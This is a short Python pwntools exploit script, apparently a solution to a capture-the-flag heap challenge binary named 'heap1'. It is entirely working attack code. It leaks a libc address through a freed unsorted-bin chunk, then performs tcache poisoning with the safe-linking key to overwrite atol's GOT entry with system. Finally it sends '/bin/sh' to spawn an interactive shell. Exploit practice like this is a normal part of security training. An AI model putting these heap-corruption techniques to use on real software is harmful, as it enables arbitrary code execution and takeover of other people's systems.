from pwn import *

p = process("./heap1")


def send_int(val):
    p.send(val)

def menu(choice):
    p.recvuntil(b">> ")
    send_int(choice)

def alloc(idx, size, data=b"\n"):
    menu(b"1")
    p.recvuntil(b"location: ")
    send_int(idx)
    p.recvuntil(b"size: ")
    send_int(size)
    p.recvuntil(b"data: ")
    p.send(data)

def free(idx):
    menu(b"2")
    p.recvuntil(b"location: ")
    send_int(idx)

def read_chunk(idx):
    menu(b"3")
    p.recvuntil(b"location: ")
    send_int(idx)
    data = p.recvline()[:-1]
    return u64(data.ljust(8, b"\x00"))

def change(idx, data):
    menu(b"4")
    p.recvuntil(b"location: ")
    send_int(idx)
    p.recvuntil(b"data: ")
    p.send(data)

# libc leak
alloc(b"8", b"2000")  
alloc(b"9", b"100")
free(b"8")
main_arena = read_chunk(b"8")
libc_base = main_arena - 0x1dcb20
log.info(f"main_arena: {hex(main_arena)}")
log.info(f"libc base: {hex(libc_base)}")

# tcache poisoning 
system = libc_base + 0x51c30

atol_got = 0x404050

alloc(b"0", b"64")   
alloc(b"1", b"64")   
alloc(b"2", b"64")   

free(b"0")        
free(b"1")      

heap_key = read_chunk(b"0")   
change(b"1", p64(atol_got ^ heap_key))  

alloc(b"3", b"64")               
alloc(b"4", b"64", p64(system))  


p.sendline(b"/bin/sh")
p.interactive()
